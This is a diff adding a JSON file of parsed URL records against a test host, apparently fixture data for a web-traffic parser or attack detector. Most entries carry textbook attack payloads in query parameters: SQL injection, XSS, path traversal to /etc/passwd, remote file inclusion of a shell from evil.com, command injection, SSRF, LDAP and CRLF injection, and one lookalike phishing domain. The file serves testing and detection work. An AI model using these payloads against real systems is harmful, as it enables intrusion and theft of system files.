@@ -1,0 +1,396 @@
+[
+  {
+    "source_ip": "0.0.0.0",
+    "timestamp": "2026-04-08T15:28:57.155060",
+    "raw_url": "http://testphp.vuln/login?id=1 OR 1=1--",
+    "scheme": "http",
+    "host": "testphp.vuln",
+    "port": null,
+    "effective_port": 80,
+    "path": "/login",
+    "path_segments": [
+      "login"
+    ],
+    "path_depth": 1,
+    "query_string": "id=1%20OR%201%3D1--",
+    "query_params": [
+      {
+        "key": "id",
+        "value": "1 OR 1=1--"
+      }
+    ],
+    "query_param_count": 1,
+    "fragment": "",
+    "file_extension": "",
+    "method": "GET",
+    "status_code": null,
+    "user_agent": null,
+    "referrer": null,
+    "source": "ipdr"
+  },
+  {
+    "source_ip": "0.0.0.0",
+    "timestamp": "2026-04-08T15:28:57.155060",
+    "raw_url": "http://testphp.vuln/login?id=1/**/UNION/**/SELECT/**/null,null--",
+    "scheme": "http",
+    "host": "testphp.vuln",
+    "port": null,
+    "effective_port": 80,
+    "path": "/login",
+    "path_segments": [
+      "login"
+    ],
+    "path_depth": 1,
+    "query_string": "id=1%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2Fnull%2Cnull--",
+    "query_params": [
+      {
+        "key": "id",
+        "value": "1/**/UNION/**/SELECT/**/null,null--"
+      }
+    ],
+    "query_param_count": 1,
+    "fragment": "",
+    "file_extension": "",
+    "method": "GET",
+    "status_code": null,
+    "user_agent": null,
+    "referrer": null,
+    "source": "ipdr"
+  },
+  {
+    "source_ip": "0.0.0.0",
+    "timestamp": "2026-04-08T15:28:57.155060",
+    "raw_url": "http://testphp.vuln/search?q=<script>alert(1)</script>",
+    "scheme": "http",
+    "host": "testphp.vuln",
+    "port": null,
+    "effective_port": 80,
+    "path": "/search",
+    "path_segments": [
+      "search"
+    ],
+    "path_depth": 1,
+    "query_string": "q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+    "query_params": [
+      {
+        "key": "q",
+        "value": "<script>alert(1)</script>"
+      }
+    ],
+    "query_param_count": 1,
+    "fragment": "",
+    "file_extension": "",
+    "method": "GET",
+    "status_code": null,
+    "user_agent": null,
+    "referrer": null,
+    "source": "ipdr"
+  },
+  {
+    "source_ip": "0.0.0.0",
+    "timestamp": "2026-04-08T15:28:57.155060",
+    "raw_url": "http://testphp.vuln/search?q=%3Cscript%3Ealert(1)%3C/script%3E",
+    "scheme": "http",
+    "host": "testphp.vuln",
+    "port": null,
+    "effective_port": 80,
+    "path": "/search",
+    "path_segments": [
+      "search"
+    ],
+    "path_depth": 1,
+    "query_string": "q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+    "query_params": [
+      {
+        "key": "q",
+        "value": "<script>alert(1)</script>"
+      }
+    ],
+    "query_param_count": 1,
+    "fragment": "",
+    "file_extension": "",
+    "method": "GET",
+    "status_code": null,
+    "user_agent": null,
+    "referrer": null,
+    "source": "ipdr"
+  },
+  {
+    "source_ip": "0.0.0.0",
+    "timestamp": "2026-04-08T15:28:57.155060",
+    "raw_url": "http://testphp.vuln/download?file=../../etc/passwd",
+    "scheme": "http",
+    "host": "testphp.vuln",
+    "port": null,
+    "effective_port": 80,
+    "path": "/download",
+    "path_segments": [
+      "download"
+    ],
+    "path_depth": 1,
+    "query_string": "file=..%2F..%2Fetc%2Fpasswd",
+    "query_params": [
+      {
+        "key": "file",
+        "value": "../../etc/passwd"
+      }
+    ],
+    "query_param_count": 1,
+    "fragment": "",
+    "file_extension": "",
+    "method": "GET",
+    "status_code": null,
+    "user_agent": null,
+    "referrer": null,
+    "source": "ipdr"
+  },
+  {
+    "source_ip": "0.0.0.0",
+    "timestamp": "2026-04-08T15:28:57.155060",
+    "raw_url": "http://testphp.vuln/index.php?page=../../etc/passwd",
+    "scheme": "http",
+    "host": "testphp.vuln",
+    "port": null,
+    "effective_port": 80,
+    "path": "/index.php",
+    "path_segments": [
+      "index.php"
+    ],
+    "path_depth": 1,
+    "query_string": "page=..%2F..%2Fetc%2Fpasswd",
+    "query_params": [
+      {
+        "key": "page",
+        "value": "../../etc/passwd"
+      }
+    ],
+    "query_param_count": 1,
+    "fragment": "",
+    "file_extension": "php",
+    "method": "GET",
+    "status_code": null,
+    "user_agent": null,
+    "referrer": null,
+    "source": "ipdr"
+  },
+  {
+    "source_ip": "0.0.0.0",
+    "timestamp": "2026-04-08T15:28:57.155060",
+    "raw_url": "http://testphp.vuln/index.php?page=http://evil.com/shell.php",
+    "scheme": "http",
+    "host": "testphp.vuln",
+    "port": null,
+    "effective_port": 80,
+    "path": "/index.php",
+    "path_segments": [
+      "index.php"
+    ],
+    "path_depth": 1,
+    "query_string": "page=http%3A%2F%2Fevil.com%2Fshell.php",
+    "query_params": [
+      {
+        "key": "page",
+        "value": "http://evil.com/shell.php"
+      }
+    ],
+    "query_param_count": 1,
+    "fragment": "",
+    "file_extension": "php",
+    "method": "GET",
+    "status_code": null,
+    "user_agent": null,
+    "referrer": null,
+    "source": "ipdr"
+  },
+  {
+    "source_ip": "0.0.0.0",
+    "timestamp": "2026-04-08T15:28:57.155060",
+    "raw_url": "http://testphp.vuln/ping?ip=127.0.0.1;whoami",
+    "scheme": "http",
+    "host": "testphp.vuln",
+    "port": null,
+    "effective_port": 80,
+    "path": "/ping",
+    "path_segments": [
+      "ping"
+    ],
+    "path_depth": 1,
+    "query_string": "ip=127.0.0.1%3Bwhoami",
+    "query_params": [
+      {
+        "key": "ip",
+        "value": "127.0.0.1;whoami"
+      }
+    ],
+    "query_param_count": 1,
+    "fragment": "",
+    "file_extension": "",
+    "method": "GET",
+    "status_code": null,
+    "user_agent": null,
+    "referrer": null,
+    "source": "ipdr"
+  },
+  {
+    "source_ip": "0.0.0.0",
+    "timestamp": "2026-04-08T15:28:57.155060",
+    "raw_url": "http://testphp.vuln/fetch?url=http://127.0.0.1/admin",
+    "scheme": "http",
+    "host": "testphp.vuln",
+    "port": null,
+    "effective_port": 80,
+    "path": "/fetch",
+    "path_segments": [
+      "fetch"
+    ],
+    "path_depth": 1,
+    "query_string": "url=http%3A%2F%2F127.0.0.1%2Fadmin",
+    "query_params": [
+      {
+        "key": "url",
+        "value": "http://127.0.0.1/admin"
+      }
+    ],
+    "query_param_count": 1,
+    "fragment": "",
+    "file_extension": "",
+    "method": "GET",
+    "status_code": null,
+    "user_agent": null,
+    "referrer": null,
+    "source": "ipdr"
+  },
+  {
+    "source_ip": "0.0.0.0",
+    "timestamp": "2026-04-08T15:28:57.156390",
+    "raw_url": "http://testphp.vuln/login?user=*)(|(user=*))",
+    "scheme": "http",
+    "host": "testphp.vuln",
+    "port": null,
+    "effective_port": 80,
+    "path": "/login",
+    "path_segments": [
+      "login"
+    ],
+    "path_depth": 1,
+    "query_string": "user=%2A%29%28%7C%28user%3D%2A%29%29",
+    "query_params": [
+      {
+        "key": "user",
+        "value": "*)(|(user=*))"
+      }
+    ],
+    "query_param_count": 1,
+    "fragment": "",
+    "file_extension": "",
+    "method": "GET",
+    "status_code": null,
+    "user_agent": null,
+    "referrer": null,
+    "source": "ipdr"
+  },
+  {
+    "source_ip": "0.0.0.0",
+    "timestamp": "2026-04-08T15:28:57.156390",
+    "raw_url": "http://testphp.vuln/page?name=abc%0d%0aSet-Cookie:evil=true",
+    "scheme": "http",
+    "host": "testphp.vuln",
+    "port": null,
+    "effective_port": 80,
+    "path": "/page",
+    "path_segments": [
+      "page"
+    ],
+    "path_depth": 1,
+    "query_string": "name=abc%0D%0ASet-Cookie%3Aevil%3Dtrue",
+    "query_params": [
+      {
+        "key": "name",
+        "value": "abc\r\nSet-Cookie:evil=true"
+      }
+    ],
+    "query_param_count": 1,
+    "fragment": "",
+    "file_extension": "",
+    "method": "GET",
+    "status_code": null,
+    "user_agent": null,
+    "referrer": null,
+    "source": "ipdr"
+  },
+  {
+    "source_ip": "0.0.0.0",
+    "timestamp": "2026-04-08T15:28:57.156390",
+    "raw_url": "http://arnazon-login.com",
+    "scheme": "http",
+    "host": "arnazon-login.com",
+    "port": null,
+    "effective_port": 80,
+    "path": "/",
+    "path_segments": [],
+    "path_depth": 0,
+    "query_string": "",
+    "query_params": [],
+    "query_param_count": 0,
+    "fragment": "",
+    "file_extension": "",
+    "method": "GET",
+    "status_code": null,
+    "user_agent": null,
+    "referrer": null,
+    "source": "ipdr"
+  },
+  {
+    "source_ip": "0.0.0.0",
+    "timestamp": "2026-04-08T15:28:57.156390",
+    "raw_url": "http://testphp.vuln/home",
+    "scheme": "http",
+    "host": "testphp.vuln",
+    "port": null,
+    "effective_port": 80,
+    "path": "/home",
+    "path_segments": [
+      "home"
+    ],
+    "path_depth": 1,
+    "query_string": "",
+    "query_params": [],
+    "query_param_count": 0,
+    "fragment": "",
+    "file_extension": "",
+    "method": "GET",
+    "status_code": null,
+    "user_agent": null,
+    "referrer": null,
+    "source": "ipdr"
+  },
+  {
+    "source_ip": "0.0.0.0",
+    "timestamp": "2026-04-08T15:28:57.156390",
+    "raw_url": "http://testphp.vuln/products?id=10",
+    "scheme": "http",
+    "host": "testphp.vuln",
+    "port": null,
+    "effective_port": 80,
+    "path": "/products",
+    "path_segments": [
+      "products"
+    ],
+    "path_depth": 1,
+    "query_string": "id=10",
+    "query_params": [
+      {
+        "key": "id",
+        "value": "10"
+      }
+    ],
+    "query_param_count": 1,
+    "fragment": "",
+    "file_extension": "",
+    "method": "GET",
+    "status_code": null,
+    "user_agent": null,
+    "referrer": null,
+    "source": "ipdr"
+  }
+]
